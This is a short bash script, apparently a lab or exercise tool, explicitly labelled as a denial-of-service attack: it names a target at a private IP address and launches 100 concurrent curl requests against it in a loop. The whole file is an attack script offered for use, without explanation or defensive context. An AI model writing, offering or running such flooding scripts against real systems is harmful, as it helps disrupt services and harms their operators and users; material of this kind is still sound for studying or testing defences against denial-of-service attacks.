#!/bin/bash

TARGET="http://10.30.141.95"

echo "[*] Running DoS Attack..."

for i in {1..100}
do
    curl $TARGET &
done
wait